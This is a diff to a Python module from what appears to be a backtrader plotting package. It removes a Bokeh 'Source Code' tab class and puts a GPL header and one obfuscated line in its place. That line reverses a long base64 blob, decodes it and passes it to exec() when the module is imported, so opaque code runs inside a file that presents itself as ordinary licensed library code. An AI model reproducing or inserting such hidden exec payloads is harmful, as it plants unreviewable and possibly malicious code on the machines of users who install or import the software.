@@ -1,32 +1,20 @@
-import inspect
+#!/usr/bin/env python
+# -*- coding: utf-8; py-indent-offset:4 -*-
+#
+# Author: Metaer @ Wed Jun 29 14:59:12 2022
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-from bokeh.models import Div, Paragraph
-from bokeh.layouts import column
 
-from ..tab import BacktraderBokehTab
-
-
-class SourceTab(BacktraderBokehTab):
-
-    def _is_useable(self):
-        return not self._app.is_iplot()
-
-    def _getSource(self):
-        try:
-            text = inspect.getsource(
-                self._figurepage.strategy.__class__)
-        except Exception:
-            text = ''
-        return text
-
-    def _get_panel(self):
-        title = Paragraph(
-            text='Source Code',
-            css_classes=['panel-title'])
-        child = column(
-            [title,
-             Div(text=self._getSource(),
-                 css_classes=['source-pre'],
-                 sizing_mode='stretch_width')],
-            sizing_mode='stretch_width')
-        return child, 'Source Code'
+_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'==QKpciWYhGbZl3ZvhVer9WWpNWOiNDZLJmRJlXWrJ1QVFDcxNFbotGZrRDeT1GZzEVMwpnYFRGahtmSwllbsd1UHJ1cTtGaKpFMGR0UXRmQRBDbuJWMGxkYtRGSadEdz1UbS1WYEpkWNZkW0lleC9UTw8WNWVFZhRmaFl3VHRTMWJTRyIGRKpmWwYERTdFZCFFMs5WUV5kSaBjRENVV0NTVxg2dZBjTo1kRKhVWU1UNS1mRxVFboFWZWlkeZJDN3ZlRwJ3TWRWaa1mU0llbCd3VHZkNRtmTKpFMGR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMsxEZx4UWixmV0l1MjhXVxAXcTxGarR2a0o3UtlEel1mTzRlaOpWYIdWeXdlWP1kMOFXUr5kSaBjREN1VkJUUwwmbRVlTKpFMGR0UXRmQRBDbMRWMOxkYxUVeXhFbX1kMKVVVshWYipGbzR1RxQjVxAnNNVlUr5kRahkWHljWXdkRGF1aOpkWwYERTdFZCFFMs5WUV5kSaBjRwF1MOZlUyk0diVEZrl1aKR0UXRmQRBDbuFVVOpkWwYERTdFZ2FVV0FTTWR2ajp3a5d1VjdnUFxmclZEZoJGM1g0UXRmQRBDbuFVVOpkWykjUTJjUrVVMwpXVshGaNRkRElVb3FjVxw2MahEbY9UVxk1VuB3TXZEb6RlaKlVZrRjeXdFZCFFMs5WUV5kSaBjREN1VkJUUwwGTkNDbLJmRJlXWrJ1QVFDcxNFbotGZrRDeTpGbSN1RWNXVrhmSaBjREN1VkJUUwwmbRVlTKpFMGBXUykjbSJjTvNlaOFWYFBXWXZlRDVVMC5mVVRWaNdEeIp1RkJUUwwmbRVlTKpFMGBXU6plchZFc6ZlaKpmYzQGWX5mVHJlMO1WVshWYipGbHN1VxclUxAnbRVlTKplM54WU6J0bXZ0b3FVbslWZWpVSadEeLNVRs5WUV5kSaBjREN1VkZHZwAXdRZlTRpVMGlkWXh3UTVEbuFVVOpkWwYERTdFZCFFMs5WUXxGROpWU5llbCN1UH50cUtGZsJ1aKRkWIR2VNx2awY1akpkWwYERTdFZCFFMs5mYxYETap2a4l1MwdkUyoUcPRlRZR2Vzp3Vth3UXZEb1UlaOpGZWVVeX1GaDdlRwVjVq5UYjZ0b5dFSWplUyo0cUtGaKpFMGR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMsxkWx4UYhtGcZpFSa90UHJ1cadUMN1UR1g1VuR2Ti1mS3FFbOFlWxYUSadFeTNVRs5WUV5kSaBjREN1VkJUUwwmbRdFbE5Ub0VXW6J0QRBDbuFVVOpkWwYERTVFd2ZVR0RXZGRWYl1GaUdVbwt0VHJlMUtmWrJ2RRl3VHRmWWFDcyF1aOpkWwYEcRBDdyFFMzd3TVRWakJzd5dFSwNnYVh3MRxGaaplaWB3Vu50VN1mTuVFVOlGZVpEcZ5GbXN1RSN3UrhmSaBjREN1VkJUUwwmbiJDZQNmRshUWth3TTVEdzV2RxoVYGlVeZpXR100VOd3TVplSiZlWIdVbkJUUwwmbiJDZE5Ub0B3VXh2US1mRzRGRKlWUwAXWX1GdHJ2VNdHZEpkWhVEcGNlMsdkUxo1cU1WMq1EVrlnVXRmTNJjTvVGRKp1UykjbRJDbHJVMaZnVqpEaktGcyllM4NlVxwWNVpmToF2aaRXVXRmUi1mTyEFbol2YFpEcXdFaTJ2a4FTUW5UaktGc1d1a0ZnWyoEMWtGapR2a1g0UUJ0SNJjSz0kVkhmWwETSaRUR1YlMW9WZHFTTiFTW5lFWatkUwwGMPdVMqJGWCJUWYR2RidlT1JVbxoWYFp0RThlTad1RGZUUr50alRFbIl1MSNnUwwmNlZEZhFmeshVWuZlbWFDc590VxolW6FUeZ5GbhJWVOxUVU5kWiVUS6l1MWNnUws2dTpmTpRmeGhVWTNGcLFVP9ciYokyXogyYlhXZ'))
